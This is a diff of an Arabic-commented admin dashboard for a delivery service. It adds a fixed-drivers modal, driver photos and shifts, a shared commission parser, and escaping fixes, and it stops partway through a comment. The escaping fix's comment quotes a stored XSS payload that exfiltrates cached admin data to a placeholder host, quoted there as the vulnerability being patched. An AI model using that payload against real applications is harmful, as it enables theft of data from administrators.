@@ -58,7 +58,7 @@
        violates: script-src 'self' 'unsafe-inline' gstatic unpkg → **blocked**
 
      مكتبة firebase-database-compat تسقط إلى **long-polling** حين يتعذّر
-     WebSocket (وكيل · جدار حماية · تقلّب شبكة)، وتحقن حينها وسم <script>
+     WebSocket (وكيل · جدار حماية · تقلّب شبكة)، وتحقن حينها وسم &lt;script&gt;
      من نطاق قاعدة البيانات نفسها.
 
      وكان النطاق مسموحاً في connect-src وحده — فالاتصال مسموح والسكربت محجوب.
@@ -94,7 +94,7 @@ try{if(localStorage.getItem(VK)!==V){localStorage.setItem(VK,V);if("caches"in wi
 
    📌 ارفع هذا الرقم كلّما غيّرت الملف — وإلا لم يصل تغييرك.
    ═══════════════════════════════════════════════════════════════════════════ */
-const ADMIN_APP_VERSION = "5.1-Sufyan-Atlas";
+const ADMIN_APP_VERSION = "5.4-Sufyan-Ledger";
 try {
   if (localStorage.getItem('hut_adm_version') !== ADMIN_APP_VERSION) {
     var _rk='hut_adm_version_reload_ts', _last=Number(localStorage.getItem(_rk)||0);
@@ -143,6 +143,10 @@ try {
 </script>
 <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
 <title>سفيان — لوحة الإدارة</title>
+<!-- [V31.1] manifest_master.json كان موجوداً في المجلّد **بلا رابط** منذ إنشائه
+     (ORPHAN_MANIFEST في البوّابة، ورُصد في أول فحصٍ لهذا النظام). ملفٌّ يُرفع
+     مع كل نشرة ولا يقرؤه أحد — واللوحة غير قابلة للتثبيت كتطبيق بلا هذا السطر. -->
+<link rel="manifest" href="manifest_master.json">
 <meta name="theme-color" content="#0a1628">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
@@ -861,6 +865,29 @@ button,input,select,textarea{font-family:'Cairo',sans-serif;}
   </div>
 </div>
 
+<!-- 🍽️ [V29 ← نحلة] نافذة كباتن المطعم الثابتين.
+     الصندوق نفسه يحمل البحث والقائمة — لأن أسطولاً بأربعين كابتناً بلا بحث
+     يعني تمريراً أعمى، فيؤشّر الإداري على الاسم الخطأ ويحصر المطعم بمن لا
+     يعمل عنده. والقائمة ترث ألوان اللوحة (--sky/--line2) بلا CSS جديد. -->
+<div id="prefMod" class="mbg" onclick="clMod('prefMod')">
+  <div class="mcard" style="max-width:520px" onclick="event.stopPropagation()">
+    <div style="width:46px;height:46px;border-radius:14px;background:var(--sky-l);display:flex;align-items:center;justify-content:center;color:var(--sky);margin:0 auto 11px;font-size:22px">🍽️</div>
+    <h4 style="font-weight:900;text-align:center;color:var(--ink);margin-bottom:3px">كباتن المطعم الثابتون</h4>
+    <p id="prefSub" style="font-size:.75rem;font-weight:700;color:var(--ink4);text-align:center;margin-bottom:14px"></p>
+    <div style="background:var(--base2);border:1px solid var(--line2);border-radius:12px;padding:9px 12px;margin-bottom:12px;font-size:.72rem;font-weight:700;color:var(--ink3);line-height:1.7">
+      ⏱️ يُعرض الطلب على هؤلاء وحدهم <b>٥</b> دقائق، ثم يُفتح للأسطول كلّه.<br>
+      🚦 وفي ساعة الزخم يُفتح فوراً — فلا يتأخّر زبون.<br>
+      🗑️ وقائمةٌ فارغة تعني الأسطول كلّه (الحال الافتراضي).
+    </div>
+    <input type="text" id="prefSearch" class="fc" style="margin-bottom:10px" placeholder="🔍 ابحث باسم الكابتن أو رقمه" oninput="prefRender()">
+    <div id="prefBody" style="max-height:42vh;overflow-y:auto;border:1px solid var(--line2);border-radius:12px;padding:5px"></div>
+    <div style="display:flex;gap:8px;margin-top:14px">
+      <button id="prefSave" onclick="prefSave()" style="flex:1;padding:11px;background:var(--sky);color:#fff;border:0;border-radius:12px;font-weight:800;cursor:pointer;font-family:'Cairo'">حفظ</button>
+      <button onclick="clMod('prefMod')" style="flex:1;padding:11px;background:var(--base2);border:1px solid var(--line2);border-radius:12px;font-weight:800;cursor:pointer;color:var(--ink3);font-family:'Cairo'">إلغاء</button>
+    </div>
+  </div>
+</div>
+
 <div id="editMod" class="mbg" onclick="clEdit()">
   <div class="mcard" style="max-width:500px" onclick="event.stopPropagation()">
     <div style="width:46px;height:46px;border-radius:14px;background:var(--sky-l);display:flex;align-items:center;justify-content:center;color:var(--sky);margin:0 auto 11px;font-size:22px">✏️</div>
@@ -1276,6 +1303,13 @@ let liveLed={drivers:{},restaurants:{}},liveMet={},liveResLoc={};
 let actDrv=new Set();
 /* 👑 [L-1] نظام الليدرز: من هو ليدر، ومتى بدأت نافذته اليوم. */
 let ldrSet=new Set(), ldrWin={};
+/* 🍽️ [V29 ← نحلة] عدد كباتن كل مطعم — لتلوين زرّ البطاقة بلا نداء لكل بطاقة.
+   لولاه لاحتاج رسمُ صفحة المطاعم نداءً مستقلاً لكل بطاقة (٤٠ مطعماً = ٤٠
+   نداءً في كل إعادة رسم)، ومستمعٌ واحد على العقدة الأمّ أرخص وأدقّ. */
+let prefCount={};
+/* 🖼️🕐 [V29 ← نحلة] صورة الكابتن وموعد شفته — من نفس مستمع drivers_locations
+   القائم، بلا نداءٍ إضافي واحد. البيانات وصلت أصلاً لحساب النشطين. */
+let drvPhoto={}, drvShift={};
 let ovr={o:{},d:{},r:{}};
 let rfilt="all",resSF="mostOrders",drvSF="mostOrders";
 let arcSC="date",arcSD="desc";
@@ -1378,8 +1412,30 @@ function listen(mkRef,cb){
   fbL.push({ref,cb});
 }
 
-function esc(s){if(s==null)return"";const d=document.createElement("div");d.textContent=String(s);return d.innerHTML;}
-function ej(s){return String(s??'').replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/"/g,'&quot;');}
+/* ═══════════════════════════════════════════════════════════════════════
+   🔒 [V28] تصحيح دالتَي التهريب.
+
+   ① esc: كانت textContent→innerHTML ⇒ تُهرّب & و < و > فقط، ولا تُهرّب
+      " ولا '. وهي مستعملة **داخل قيم سمات** في أربعة مواضع على الأقل:
+        1640-1641  <option value="${esc(r[R.NAME])}">
+        2511-2512  <input value="${esc(a)}">
+        2653       <option value="${esc(String(d[D.PHONE]))}">
+        2681       const cardId=`oc-${esc(oId)}-…`  ثم داخل id="${cardId}"
+      واسم المطعم/الكابتن **يُدخله الشريك نفسه عند التسجيل** ثم يصل عبر
+      getGlobalData ⇒ XSS مخزَّنة موجَّهة إلى لوحة الإدارة:
+        مطعم" onfocus="fetch('//x/?d='+localStorage.hut_adm_gd_v1)" autofocus x="
+      ⇒ تُسرَّب ذاكرة getGlobalData كاملة (كل المطاعم والكباتن).
+      وحقل id مُحصَّن عند الإنشاء فقط — وفرع التعديل لا يذكره
+      (عولج الآن في rules أيضاً كحزامٍ ثانٍ).
+
+   ② ej: لا تُهرّب & ⇒ &#39; يفكّه محلّل HTML إلى ' قبل محلّل JS
+      ⇒ خروجٌ من السلسلة داخل onclick رغم التهريب الظاهر.
+   ═══════════════════════════════════════════════════════════════════════ */
+function esc(s){ if(s==null) return "";
+  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")
+                  .replace(/"/g,"&quot;").replace(/'/g,"&#39;"); }
+function ej(s){ return String(s??'').replace(/&/g,'&amp;').replace(/\\/g,'\\\\')
+                                    .replace(/'/g,"\\'").replace(/"/g,'&quot;'); }
 /* 🔧[خ٧] التطبيع الموحّد حرفياً مع GAS V16.0 و CF-6.0:
    أرقام عربية/فارسية → لاتينية، إسقاط 964، إسقاط كل الأصفار البادئة. */
 function nP(p){
@@ -1429,21 +1485,113 @@ function scheduleDerived(){
 }
 const _drvListDebounced=debounce(()=>{if(gD&&document.getElementById("pg-drivers").classList.contains("on"))filtEnt("DRV");},600);
 
-function pComm(cs,pt){
-  const s=String(cs||"").toLowerCase().trim(),ptt=String(pt||"").trim();
-  if(!s||s==="0")return{drv:0,res:0,monthly:false};
-  if(s.includes("شهري"))return{drv:0,res:0,monthly:true};
-  if(s.includes("/")){const p=s.split("/");return{drv:parseFloat(p[0])||0,res:parseFloat(p[1])||0,monthly:false};}
-  const v=parseFloat(s)||0;
-  if(ptt.includes("مناصفة"))return{drv:v/2,res:v/2,monthly:false};
-  return{drv:0,res:v,monthly:false};
+/* ═══════════════════════════════════════════════════════════════════════════
+   💰 [V31 · م-٢/م-٦] كتلة المال المشتركة — منقولة **حرفياً** من
+   server/index.js (toLatinDigits:5202 · parseAmount:5281 · cleanNumber:5318 ·
+   parseCommissionRule:5328). لا تُعدَّل هنا وحدها أبداً: أي تغيير يُنقل إلى
+   الخمسة معاً (index.js · Code.gs · Master.html · restaurant.html · clearing.html).
+   ───────────────────────────────────────────────────────────────────────────
+   لماذا نُقلت؟ كان في النظام **خمسة مُحلّلات** لنفس القاعدة، اثنان منها
+   متطابقان على السيرفر وثلاثة مختلفة في اللوحات:
+
+     • restaurant.html كان يعالج "/" وحدها ⇒ قاعدة "1000-500" تُقرأ
+       parseFloat("1000-500") = 1000، فالمطعم يرى دَيناً **ضِعف** ما يحاسبه
+       السيرفر (500). وفارقٌ في الفاتورة لا يُكتشف إلا بمراجعةٍ يدوية.
+     • pComm في لوحة الإدارة: لا "-" ولا "\"، وparseFloat على المال ⇒
+       "1.000" تُقرأ 1، و"١٠٠٠/٥٠٠" تُقرأ صفراً.
+     • مبلغ الاشتراك كان يُستخرج بـ match(/\d+/) ⇒ "شهري 50.000" = **50**،
+       و"٥٠٠٠٠" = **0**. خطأٌ بألف ضعف في فاتورةٍ شهرية.
+
+   العملة العراقية بلا كسور عملياً: كل فاصل تتبعه ٣ خانات = آلاف،
+   و"15.5" غامضٌ ⇒ يُرفض صراحةً بدل أن يُخمَّن.
+   ═══════════════════════════════════════════════════════════════════════════ */
+function toLatinDigits(s){
+  return String(s===null||s===undefined?"":s)
+    .replace(/[٠-٩]/g,function(d){return String.fromCharCode(d.charCodeAt(0)-0x0660+48);})
+    .replace(/[۰-۹]/g,function(d){return String.fromCharCode(d.charCodeAt(0)-0x06F0+48);});
 }
+function parseAmount(raw,opts){
+  opts=opts||{};
+  const s0=toLatinDigits(raw).trim();
+  if(s0==="")return{ok:false,value:null,reason:"empty"};
+  let s=s0.replace(/[\s ٬]/g,"").replace(/د\.?ع|IQD|iqd|دينار/g,"");
+  let neg=false;
+  if(/^-/.test(s)){neg=true;s=s.slice(1);}
+  else if(/-$/.test(s)){neg=true;s=s.slice(0,-1);}
+  if(s==="")return{ok:false,value:null,reason:"no_digits"};
+  if(/[^0-9.,]/.test(s))return{ok:false,value:null,reason:"bad_chars",got:s0};
+  const seps=s.match(/[.,]/g)||[];
+  if(seps.length>0){
+    const parts=s.split(/[.,]/),tail=parts.slice(1);
+    if(tail.every(function(p){return p.length===3;})&&parts[0].length>=1)s=parts.join("");
+    else if(seps.length===1&&tail[0].length>0&&tail[0].length<3)
+      return{ok:false,value:null,reason:"ambiguous_decimal",got:s0};
+    else return{ok:false,value:null,reason:"bad_separators",got:s0};
+  }
+  if(!/^\d+$/.test(s))return{ok:false,value:null,reason:"not_integer",got:s0};
+  const n=Number(s);
+  if(!isFinite(n))return{ok:false,value:null,reason:"overflow",got:s0};
+  if(neg&&opts.allowNegative!==true)return{ok:false,value:null,reason:"negative_not_allowed",got:s0};
+  return{ok:true,value:neg?-n:n,reason:null};
+}
+/* لا noteReject هنا — لا سجلّ سيرفري في اللوحة. والسلوك الرقمي مطابق. */
+function cleanNumber(val){
+  const r=parseAmount(val,{allowNegative:true});
+  return r.ok?r.value:0;
+}
+function parseCommissionRule(commStr,payTypeStr){
+  const str=String(commStr).toLowerCase().trim();
+  const pType=String(payTypeStr||"").trim();
+  let baseDrv=0,baseRes=0,isMonthly=false;
+  if(str.indexOf("شهري")>-1||str==="monthly"){
+    isMonthly=true;
+  }else if(str.indexOf("/")>-1||str.indexOf("-")>-1||str.indexOf("\\")>-1){
+    const parts=str.split(/[\/\-\\]/).map(function(x){return String(x).trim();}).filter(function(x){return x!=="";});
+    if(parts.length!==2){
+      /* صيغةٌ معطوبة ("1000-" أو "-1000"): تُعامَل رقماً مفرداً بقيمةٍ مطلقة —
+         وإلا انقلب الدوران أو صار الدَين رصيداً صامتاً لصالح المطعم. */
+      const single=Math.abs(cleanNumber(parts[0]||"0"));
+      if(pType.indexOf("مناصفة")>-1)return{drv:single/2,res:single/2,isMonthly:false,malformed:true};
+      return{drv:0,res:single,isMonthly:false,malformed:true};
+    }
+    return{drv:cleanNumber(parts[0]),res:cleanNumber(parts[1]),isMonthly:false};
+  }else{
+    const val=cleanNumber(str);
+    if(pType.indexOf("مناصفة")>-1){baseDrv=val/2;baseRes=val/2;}
+    else{baseDrv=0;baseRes=val;}
+  }
+  return{drv:baseDrv,res:baseRes,isMonthly:isMonthly};
+}
+/* 💳 [V31 · م-٢] مبلغ الاشتراك الشهري — الكلمات تُسقَط ثم يُقرأ الباقي
+   بقارئ المبالغ نفسه. كان match(/\d+/): لاتينيٌّ فقط ولا يفهم فاصل الآلاف. */
+function monthlySubAmount(commRaw){
+  const s=String(commRaw==null?"":commRaw);
+  if(s.indexOf("شهري")===-1&&s.toLowerCase().indexOf("monthly")===-1)return null;
+  return cleanNumber(s.replace(/اشتراك|شهري|monthly/gi,""));
+}
+
+/* pComm صارت غلافاً رفيعاً على المُحلّل المشترك. والمفتاحان `monthly` و
+   `isMonthly` يُرجعان معاً: الأول للمُنادين القدامى، والثاني هو اسم السيرفر
+   — وخلطُهما هو ما جعل فرع «شهري» في forceComplete ميّتاً بلا أن يلاحظه أحد. */
+function pComm(cs,pt){
+  const r=parseCommissionRule(cs,pt);
+  return {drv:r.drv,res:r.res,monthly:r.isMonthly,isMonthly:r.isMonthly,malformed:!!r.malformed};
+}
+/* 🔧 [V31 · م-٦] العرض يُشتقّ من المُحلّل نفسه لا من تحليلٍ ثالث.
+   كان: match(/\d+/) للشهري ⇒ «شهري 50.000» تُعرض «50 د.ع»، وsplit("/")
+   وحدها ⇒ قاعدة «1000-500» تُعرض رقماً واحداً. والإدارة تراجع القاعدة
+   بهذا العرض — فعرضٌ خاطئ يعني قاعدةً خاطئة لا يراها أحد. */
 function cDisp(cs){
   const s=String(cs||"").toLowerCase().trim();
   if(!s||s==="0")return{text:"بدون عمولة",cls:""};
-  if(s.includes("شهري")){const m=s.match(/\d+/);return{text:m?`📅 شهري: ${m[0]} د.ع`:"📅 اشتراك شهري",cls:"ct-m"};}
-  if(s.includes("/")){const p=s.split("/");return{text:`📊 كابتن ${p[0]} / مطعم ${p[1]} د.ع`,cls:"ct-sp"};}
-  return{text:`💰 ${cs} د.ع / طلب`,cls:"ct-f"};
+  const r=parseCommissionRule(cs,"");
+  if(r.isMonthly){
+    const amt=monthlySubAmount(cs);
+    return{text:amt?`📅 شهري: ${amt.toLocaleString("en-US")} د.ع`:"📅 اشتراك شهري",cls:"ct-m"};
+  }
+  if(r.malformed)return{text:`⚠️ صيغة معطوبة «${cs}» — تُقرأ: مطعم ${r.res} د.ع`,cls:"ct-f"};
+  if(r.drv>0)return{text:`📊 كابتن ${r.drv} / مطعم ${r.res} د.ع`,cls:"ct-sp"};
+  return{text:`💰 ${r.res.toLocaleString("en-US")} د.ع / طلب`,cls:"ct-f"};
 }
 /* 🩹[خ٣٣] البحث عن المطعم بالهاتف أولاً — المفتاح الحقيقي.
    البحث بالاسم كان يخلط مطعمين متشابهي الاسم (أو فرعين)، فتظهر
@@ -1752,6 +1900,17 @@ function setupFB(){
          عشرين كابتناً ينبضون كل 10–20 ثانية = 60–120 عملية DOM في الدقيقة،
          وهي أثقل مصدر تقطيع في اللوحة. الآن: عدٌّ فقط. */
       if(d.status==="active"&&d.lat&&d.lng&&!stale) actDrv.add(nP(phone));
+      /* 🖼️🕐 [V29 ← نحلة] الصورة والشفت من نفس اللقطة — صفر نداء إضافي.
+         ⚠️ والحذف عند الغياب مقصود: لو اكتفينا بالإسناد لبقيت صورةٌ قديمة
+            معلّقةً بعد أن يحذفها الكابتن من تطبيقه، فترى الإدارة وجهاً
+            لم يعد موجوداً. وكذلك الشفت بعد إلغائه. */
+      const _n=nP(phone);
+      if(d.photo) drvPhoto[_n]=String(d.photo); else delete drvPhoto[_n];
+      if(d.shift_h!==undefined&&d.shift_h!==null){
+        const _h=Number(d.shift_h), _l=Number(d.shift_len||10), _e=(_h+_l)%24;
+        const _lb=x=>((x%12)||12)+(x<12?"ص":"م");
+        drvShift[_n]=_lb(_h)+" ← "+_lb(_e)+" · "+_l+"س";
+      } else delete drvShift[_n];
       /* 👑 [L-1] علَم الليدر ونافذته — من المستمع القائم، بلا قراءة إضافية. */
       if(d.is_leader===true) ldrSet.add(nP(phone)); else ldrSet.delete(nP(phone));
       if(d.leader_window_start) ldrWin[nP(phone)]=d.leader_window_start; else delete ldrWin[nP(phone)];
@@ -1882,6 +2041,14 @@ function setupFB(){
   },400);
 const rlCb=snap=>{liveResLoc=snap.val()||{};_rlDebounced();};
   listen(()=>db.ref("restaurants_locations"),rlCb);
+  /* 🍽️ [V29 ← نحلة] العقدة صغيرة (مفاتيح منطقية لا كائنات)، ومستمعٌ واحد
+     عليها أرخص من نداءٍ لكل بطاقة مطعم. والقواعد تسمح للإدارة بقراءة الأمّ:
+     restaurant_drivers له ".read" لدور admin/staff. */
+  listen(()=>db.ref("restaurant_drivers"),snap=>{
+    const v=snap.val()||{};prefCount={};
+    Object.keys(v).forEach(rp=>{const dl=v[rp]&&v[rp].drivers;if(dl)prefCount[nP(rp)]=Object.keys(dl).filter(k=>dl[k]===true).length;});
+    if(document.getElementById("pg-restaurants")?.classList.contains("on"))filtEnt("RES");
+  });
   if(!_alInit){_alInit=true;listen(()=>db.ref("system_alerts").limitToLast(60),snap=>{alData=[];const v=snap.val();if(v)Object.keys(v).forEach(k=>alData.unshift({id:k,...v[k]}));updTicker();if(document.getElementById("pg-aiops").classList.contains("on"))renderAlerts();});}
   if(!_auInit){_auInit=true;listen(()=>db.ref("admin_audit_trail").limitToLast(120),snap=>{auData=[];const v=snap.val();if(v)Object.keys(v).forEach(k=>auData.unshift(v[k]));if(document.getElementById("pg-audit").classList.contains("on"))renderAudit();});}
   setupStaffFB();
@@ -1990,17 +2157,25 @@ function filtEnt(type){
       const ov=ex.querySelector(".ls-ord"),dv=ex.querySelector(".ls-debt");
       if(ov)ov.textContent=orders.toLocaleString("ar-EG");
       if(dv)dv.textContent=debt.toLocaleString("ar-EG")+" د.ع";
+      /* 🍽️ [V29 ← نحلة] تلوين زرّ الكباتن على البطاقة القائمة أيضاً.
+         بدونه: يحفظ الإداري أوّل قائمة لمطعم فيبقى الزرّ رمادياً حتى إعادة
+         التحميل، فيظنّ أن الحفظ لم ينجح ويحفظ مرّتين. */
+      if(type==="RES"){const pb=ex.querySelector(".ea-pref");
+        if(pb){pb.style.background=prefCount[n]?"#0ea5e9":"#e2e8f0";pb.style.color=prefCount[n]?"#fff":"#64748b";}}
       return;
     }
     const pj=ej(phone);
     const html=`<div id="${cid}" class="ec ec-${status}">
       ${extra}
       <div class="ec-top">
-        <div class="ec-av">${type==="RES"?"🍽":"🛵"}</div>
+        <div class="ec-av">${type==="DRV"&&drvPhoto[n]
+          ? `<img src="${esc(drvPhoto[n])}" alt="" loading="lazy" style="width:100%;height:100%;border-radius:inherit;object-fit:cover">`
+          : (type==="RES"?"🍽":"🛵")}</div>
         <span class="sp ${spC}">${esc(spL)}</span>
       </div>
       <div class="ec-n">${esc(name)}</div>
       <div class="ec-ph">${esc(phone)}</div>
+      ${type==="DRV"&&drvShift[n] ? `<div class="ec-ph" style="color:#0369a1;font-weight:700">🕐 ${esc(drvShift[n])}</div>` : ""}
       <div class="ls">
         <div class="lm"><div class="lv b ls-ord">${orders.toLocaleString("ar-EG")}</div><div class="ll">طلبات منجزة</div></div>
         <div class="lm"><div class="lv r ls-debt">${debt.toLocaleString("ar-EG")} د.ع</div><div class="ll">عمولة مستحقة</div></div>
@@ -2011,6 +2186,7 @@ function filtEnt(type){
           <button class="ea ea-p" title="استراحة" onclick="doAct('PAUSE','${type}','${pj}',this)">⏸</button>
           <button class="ea ea-b" title="حظر"      onclick="doAct('BAN','${type}','${pj}',this)">🚫</button>
           ${type==="DRV" ? `<button class="ea" title="${ldrSet.has(n)?"إلغاء صفة الليدر":"جعله ليدر"}" style="background:${ldrSet.has(n)?"#7c3aed":"#e2e8f0"};color:${ldrSet.has(n)?"#fff":"#64748b"}" onclick="toggleLeader('${pj}',${ldrSet.has(n)?"false":"true"},this)">&#128081;</button>` : ""}
+          ${type==="RES" ? `<button class="ea ea-pref" title="كباتن المطعم الثابتون" style="background:${prefCount[n]?"#0ea5e9":"#e2e8f0"};color:${prefCount[n]?"#fff":"#64748b"}" onclick="opPref('${pj}')">&#127869;</button>` : ""}
           <button class="ea ea-d" title="حذف"      onclick="doAct('DEL','${type}','${pj}',this)">🗑</button>
           <button class="ea ea-e" title="تعديل"   onclick="opEdit('${type}','${pj}')">✏️</button>
         </div>
@@ -2051,6 +2227,110 @@ window.toggleLeader=function(pj,on,btn){
     .then(function(){toast(isOn?"👑 صار ليدراً ✅":"عاد كابتناً عادياً ✅");})
     .catch(function(e){toast("تعذّر: "+e.message);})
     .finally(function(){if(btn)btn.disabled=false;});
+};
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   🍽️ [V29 ← نحلة] كباتن المطعم الثابتون
+   ───────────────────────────────────────────────────────────────────────────
+   المحرك (server/index.js · PREFER_RESTAURANT_DRIVERS) يقرأ
+   restaurant_drivers/{هاتف المطعم}/drivers ويعرض الطلب على هؤلاء وحدهم
+   خمس دقائق. لكن **لا شاشة تكتب العقدة** — فالميزة كانت معطّلة عملياً:
+   قائمةٌ فارغة دائماً ⇒ الأسطول كلّه دائماً. هذه هي الشاشة.
+
+   🔒 والكتابة للإداري وحده (قواعد V29: ".write": role == 'admin')، وMaster
+      يدخل بتوكن مخصّص من VERIFY_MASTER_PASS دوره admin ⇒ يمرّ.
+
+   🧹 والحفظ **فرقٌ لا دهس**: نُرسل null لمن أُزيل وtrue لمن أُضيف في تحديث
+      واحد. فلو فُتحت النافذة على بيانات قديمة (وصلت إضافةٌ من جهاز آخر بين
+      الفتح والحفظ) لا نمحو ما لم نره — نمحو ما أزاله الإداري بيده فقط.
+
+   ⚠️ ولا نكتب أي مفتاح غير drivers/updated_at/updated_by — القواعد ترفض
+      ما سواها ($other:.validate=false)، فمفتاحٌ زائد يُفشل **التحديث كلّه**
+      لا جزءه (update ذرّي).
+   ═══════════════════════════════════════════════════════════════════════════ */
+let _prefRes="", _prefName="", _prefOrig=new Set(), _prefSel=new Set();
+
+window.opPref=function(pj){
+  const phone=nP(String(pj||""));
+  if(!phone){toast("رقم غير صالح ❌","e");return;}
+  const item=gD?.restaurants?.find(i=>nP(i[2])===phone);
+  _prefRes=phone; _prefName=item?String(item[1]):phone;
+  _prefOrig=new Set(); _prefSel=new Set();
+  document.getElementById("prefSub").textContent=_prefName+" · "+phone;
+  document.getElementById("prefSearch").value="";
+  document.getElementById("prefBody").innerHTML=`<div style="text-align:center;padding:18px;color:var(--ink4);font-size:.78rem;font-weight:700">جارٍ الجلب…</div>`;
+  opMod("prefMod");
+  /* 🔄 نقرأ الحال الفعلي عند كل فتح (once) لا من prefCount المخزَّن — فهو
+     عدٌّ لا قائمة، والحفظ يحتاج المجموعة نفسها ليحسب الفرق. */
+  db.ref("restaurant_drivers/"+phone+"/drivers").once("value")
+    .then(function(s){
+      const v=s.val()||{};
+      Object.keys(v).forEach(function(k){ if(v[k]===true){ const n=nP(k); if(n){_prefOrig.add(n);_prefSel.add(n);} } });
+      prefRender();
+    })
+    .catch(function(e){
+      document.getElementById("prefBody").innerHTML=`<div style="text-align:center;padding:18px;color:var(--rose);font-size:.78rem;font-weight:700">تعذّر الجلب: ${esc(e.message)}</div>`;
+    });
+};
+
+window.prefRender=function(){
+  const q=(document.getElementById("prefSearch")?.value||"").trim().toLowerCase();
+  const all=(gD?.drivers||[]).slice(1).filter(function(d){
+    const st=d[D.STATUS];
+    /* المحذوف والموقوف لا يُعرضان — إلا إن كانا في القائمة أصلاً، فيُعرضان
+       ليراهما الإداري ويُزيلهما. قائمةٌ فيها كابتن محظور تُضيّق بلا فائدة:
+       المحرك يستبعده، فيبقى المطعم بأربعة كباتن يظنّهم خمسة. */
+    return (st!=="deleted"&&st!=="banned")||_prefSel.has(nP(d[2]));
+  });
+  let list=all;
+  if(q)list=all.filter(d=>String(d[1]).toLowerCase().includes(q)||String(d[2]).toLowerCase().includes(q));
+  /* المختارون أولاً — فالإداري يرى قائمته الحالية بلا تمرير. */
+  list=list.slice().sort(function(a,b){
+    const sa=_prefSel.has(nP(a[2]))?0:1, sb=_prefSel.has(nP(b[2]))?0:1;
+    return sa-sb || String(a[1]).localeCompare(String(b[1]),"ar");
+  });
+  const body=document.getElementById("prefBody");
+  if(!list.length){body.innerHTML=`<div style="text-align:center;padding:18px;color:var(--ink4);font-size:.78rem;font-weight:700">لا نتائج</div>`;return;}
+  body.innerHTML=list.map(function(d){
+    const n=nP(d[2]), on=_prefSel.has(n), live=actDrv.has(n);
+    /* 🔒 اسم الكابتن يُدخله هو عند التسجيل ⇒ نصٌّ يتحكّم به المهاجم:
+       esc() للنصّ، و ej() للرقم داخل سلسلة JS في onchange. */
+    return `<label style="display:flex;align-items:center;gap:9px;padding:8px 9px;border-radius:10px;cursor:pointer;background:${on?"var(--sky-l)":"transparent"};margin-bottom:3px">
+      <input type="checkbox" ${on?"checked":""} onchange="prefTgl('${ej(n)}',this.checked)" style="width:17px;height:17px;accent-color:var(--sky);cursor:pointer">
+      <span style="flex:1;font-size:.78rem;font-weight:800;color:var(--ink)">${esc(d[1])}</span>
+      <span style="font-size:.68rem;font-weight:700;color:var(--ink4)">${esc(d[2])}</span>
+      <span style="font-size:.62rem;font-weight:800;color:${live?"#16a34a":"var(--ink4)"}">${live?"🟢":"⚪"}</span>
+    </label>`;
+  }).join("");
+  document.getElementById("prefSave").textContent="حفظ ("+_prefSel.size+" كابتن)";
+};
+
+window.prefTgl=function(n,on){ if(on)_prefSel.add(String(n)); else _prefSel.delete(String(n)); prefRender(); };
+
+window.prefSave=function(){
+  const btn=document.getElementById("prefSave");
+  const added=[..._prefSel].filter(n=>!_prefOrig.has(n));
+  const removed=[..._prefOrig].filter(n=>!_prefSel.has(n));
+  if(!added.length&&!removed.length){toast("لا تغيير");clMod("prefMod");return;}
+  /* ⚠️ الإفراغ ليس «لا أحد» بل «الجميع» — عكس ما يتوقّعه من ضغط بلا تفكير.
+     فنسأله صراحةً قبل أن يفتح مطعماً حصرياً على الأسطول كلّه. */
+  if(!_prefSel.size&&!confirm("إفراغ القائمة يُعيد هذا المطعم إلى الأسطول كلّه.\n\nمتابعة؟"))return;
+  btn.disabled=true;
+  const base="restaurant_drivers/"+_prefRes;
+  const upd={};
+  added.forEach(n=>{ upd[base+"/drivers/"+n]=true; });
+  removed.forEach(n=>{ upd[base+"/drivers/"+n]=null; });
+  upd[base+"/updated_at"]=new Date().toISOString();
+  upd[base+"/updated_by"]="admin";
+  db.ref().update(upd)
+    .then(function(){
+      _prefOrig=new Set(_prefSel);
+      toast("✅ حُفظت قائمة "+_prefName+" ("+_prefSel.size+" كابتن)");
+      logAudit("prefDrivers",`كباتن ${_prefName}: ${_prefSel.size} (+${added.length} · −${removed.length})`);
+      clMod("prefMod");
+    })
+    .catch(function(e){ toast("تعذّر الحفظ: "+e.message,"e"); })
+    .finally(function(){ btn.disabled=false; });
 };
 
 function doAct(cmd,type,id,el){
@@ -2889,16 +3169,36 @@ window.forceComplete=function(oId,el){
   if(!MP)return toast("انتهت الجلسة","e");
   if(!confirm("تأكيد إكمال الطلب؟ ستُحتسب المحاسبة تلقائياً في التقرير الليلي."))return;
   if(el){el.disabled=true;el.classList.add("loading");}
-  const order=liveOrd.find(o=>String(o[O.ID])===String(oId));
-  // 🩹 [② عمولة خاطئة] findRes يطابق بالهاتف أولاً (خ٣٣) — كان .find بالاسم
-  //   يخلط مطعمين بنفس الاسم فيكتب عمولة الخطأ. الآن مطابقة الهاتف الموثوقة.
-  const rD=order?findRes(order):null;
-  const cr=rD?pComm(String(rD[R.COMM]||"0"),String(rD[R.PAY]||"")):{drv:0,res:0};
+  /* ═══════════════════════════════════════════════════════════════════════
+     🔴 [V31 · م-١] أُزيلت كتابة comm و payType من هنا — وكانت تمحو عمولة
+     الكابتن في كل إكمالٍ يدوي.
+     ───────────────────────────────────────────────────────────────────────
+     حقل comm في الطلب **قاعدةٌ لا مبلغ**: "1000/500" أو "2000" أو "شهري"،
+     يختمها orderSanitizer عند الإنشاء عمداً (index.js:2104) لتبقى ثابتةً
+     مهما تغيّرت إعدادات المطعم بعدها. وكان السطران يستبدلانها بـ**حصّة
+     المطعم المحسوبة**، ثم يعيد الأرشيف الليلي تحليلها قاعدةً من جديد
+     (index.js:3626: parseCommissionRule(o.comm, o.payType)) ⇒ القسمة
+     تُطبَّق مرّتين:
+
+         "1000/500" · المطعم يدفع  →  الكابتن 1000 يصير **0**
+         "2000"     · مناصفة       →  1000/1000 يصير **500/500**
+         المطعم غير موجود في الشيت →  comm = 0 (مسحٌ كامل)
+
+     ولا حارس يمنعه: قاعدة ثبات comm مستثناةٌ صراحةً للإدارة (rules:111)،
+     وcommBackfillGuard لا تُعالج إلا comm_missing على طلبٍ **غير منتهٍ**.
+
+     وكان في السطر عطبٌ ثانٍ صامت: pComm تُرجع المفتاح `monthly`
+     (Master.html:1487,1491) والمُنادي يقرأ `cr.isMonthly` — undefined
+     دائماً ⇒ فرع «شهري» ميّت، ومطاعم الاشتراك تفقد علامتها على الطلب.
+
+     ⇒ الحلّ هو ما فُعل في تطبيق الكابتن (driver.html:4600 «أُزيلت comm و
